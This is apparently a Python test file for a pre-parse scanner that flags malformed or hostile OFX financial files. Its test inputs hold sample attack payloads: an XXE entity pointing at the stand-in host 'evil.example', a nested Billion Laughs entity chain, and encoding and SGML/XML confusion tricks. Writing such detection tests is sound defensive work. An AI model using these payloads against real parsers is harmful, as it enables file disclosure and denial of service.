"""Tests for the malformed/parser-confusion check.

These tests operate on raw bytes -- the malformed check must NEVER hand a
hostile file to a real parser, so detection is structural and pre-parse.
"""

from __future__ import annotations

from ferryman.checks.malformed import _count_entities, check_malformed


def test_xxe_doctype_entity_is_detected(xxe_file):
    findings = check_malformed(xxe_file.read_bytes())
    types = {f.type for f in findings}
    assert "xxe" in types, f"expected an xxe finding, got types: {types}"
    xxe = next(f for f in findings if f.type == "xxe")
    assert xxe.check == "malformed"
    assert xxe.severity in ("high", "critical")


def test_clean_file_has_no_xxe(clean_file):
    findings = check_malformed(clean_file.read_bytes())
    assert all(f.type != "xxe" for f in findings)


def test_external_general_entity_reference_flagged():
    # ENTITY pointing at a remote SYSTEM URI is the classic XXE vector.
    payload = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE OFX [<!ENTITY x SYSTEM "http://evil.example/x">]>\n'
        b"<OFX>&x;</OFX>"
    )
    findings = check_malformed(payload)
    assert any(f.type == "xxe" for f in findings)


def test_oversized_field_flagged():
    huge = b"<NAME>" + b"A" * 200_000 + b"</NAME>"
    payload = b"<OFX>" + huge + b"</OFX>"
    findings = check_malformed(payload)
    assert any(f.type == "oversized_field" for f in findings)


def test_sgml_xml_confusion_flagged():
    # An XML declaration alongside a v1 SGML OFXHEADER line is a confusion
    # attempt -- the document claims to be both at once.
    payload = (
        b'<?xml version="1.0"?>\n'
        b"OFXHEADER:100\n"
        b"DATA:OFXSGML\n"
        b"VERSION:102\n\n"
        b"<OFX></OFX>"
    )
    findings = check_malformed(payload)
    assert any(f.type == "sgml_xml_confusion" for f in findings)


def test_encoding_trick_flagged():
    # A BOM / null bytes inside an ostensibly USASCII OFX file is an
    # encoding-confusion trick aimed at parser disagreement.
    payload = b"OFXHEADER:100\nENCODING:USASCII\n\n<OFX>\x00\x00<ACCTID>1</ACCTID></OFX>"
    findings = check_malformed(payload)
    assert any(f.type == "encoding_trick" for f in findings)


# --- Entity-expansion (Billion Laughs) detection ---


def test_count_entities_counts_declarations():
    raw = (
        b"<!DOCTYPE OFX [\n"
        b'  <!ENTITY a "x">\n'
        b'  <!ENTITY b "&a;">\n'
        b'  <!entity c "&b;">\n'  # case-insensitive
        b"]>"
    )
    assert _count_entities(raw) == 3


def test_entity_bomb_detected(entity_bomb_file):
    findings = check_malformed(entity_bomb_file.read_bytes())
    types = {f.type for f in findings}
    assert "entity_expansion" in types, f"expected entity_expansion, got: {types}"
    bomb = next(f for f in findings if f.type == "entity_expansion")
    assert bomb.check == "malformed"
    assert bomb.severity == "critical"


def test_entity_bomb_inline_payload_detected():
    # 3-level nested chain: c -> b -> a. The recursive references are what
    # make this a Billion-Laughs DoS rather than a benign declaration.
    payload = (
        b'<?xml version="1.0"?>\n'
        b"<!DOCTYPE OFX [\n"
        b'  <!ENTITY a "boom">\n'
        b'  <!ENTITY b "&a;&a;&a;">\n'
        b'  <!ENTITY c "&b;&b;&b;">\n'
        b"]>\n"
        b"<OFX>&c;</OFX>"
    )
    findings = check_malformed(payload)
    assert any(f.type == "entity_expansion" for f in findings)


def test_clean_file_no_entity_expansion(clean_file):
    # Legitimate OFX has zero custom entities -- no false positive.
    findings = check_malformed(clean_file.read_bytes())
    assert all(f.type != "entity_expansion" for f in findings)


def test_single_entity_no_entity_expansion():
    # One entity declaration is below the >=3 threshold; not a bomb.
    payload = (
        b'<?xml version="1.0"?>\n'
        b"<!DOCTYPE OFX [\n"
        b'  <!ENTITY a "just a value">\n'
        b"]>\n"
        b"<OFX>&a;</OFX>"
    )
    findings = check_malformed(payload)
    assert all(f.type != "entity_expansion" for f in findings)


def test_two_entities_no_cross_reference_no_entity_expansion():
    # Two flat entities that never reference each other -- below the >=3
    # threshold AND no nested reference. No entity_expansion finding.
    payload = (
        b'<?xml version="1.0"?>\n'
        b"<!DOCTYPE OFX [\n"
        b'  <!ENTITY a "alpha">\n'
        b'  <!ENTITY b "beta">\n'
        b"]>\n"
        b"<OFX>&a;&b;</OFX>"
    )
    findings = check_malformed(payload)
    assert all(f.type != "entity_expansion" for f in findings)


def test_three_flat_entities_no_cross_reference_no_entity_expansion():
    # Three entities but none reference another -- meets the count threshold
    # but lacks the nested-reference pattern, so it is not a Billion Laughs
    # chain. Must not false-positive.
    payload = (
        b'<?xml version="1.0"?>\n'
        b"<!DOCTYPE OFX [\n"
        b'  <!ENTITY a "alpha">\n'
        b'  <!ENTITY b "beta">\n'
        b'  <!ENTITY c "gamma">\n'
        b"]>\n"
        b"<OFX>&a;&b;&c;</OFX>"
    )
    findings = check_malformed(payload)
    assert all(f.type != "entity_expansion" for f in findings)
